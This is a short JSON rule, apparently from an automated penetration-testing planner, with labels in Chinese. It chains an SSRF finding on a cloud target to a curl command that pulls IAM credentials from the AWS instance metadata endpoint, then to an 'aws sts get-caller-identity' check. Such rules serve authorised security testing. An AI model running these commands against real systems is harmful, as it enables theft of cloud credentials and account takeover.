{
  "id": "R-CHAIN-SSRF-CLOUD",
  "name": "SSRF→IMDS→IAM→枚举",
  "category": "chain",
  "when": {
    "all": [
      {
        "fact": "class",
        "op": "contains",
        "value": "ssrf"
      },
      {
        "fact": "cloud",
        "op": "eq",
        "value": true
      }
    ]
  },
  "then": {
    "hypothesis": "SSRF 云凭据攻击链",
    "actions": [
      {
        "tool": "curl",
        "cmd": "curl {ssrf_url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      },
      {
        "tool": "aws",
        "cmd": "aws sts get-caller-identity"
      }
    ],
    "on_hit_class": "cloud.credential",
    "priority": {
      "impact": 0.95,
      "cost": 0.3
    }
  }
}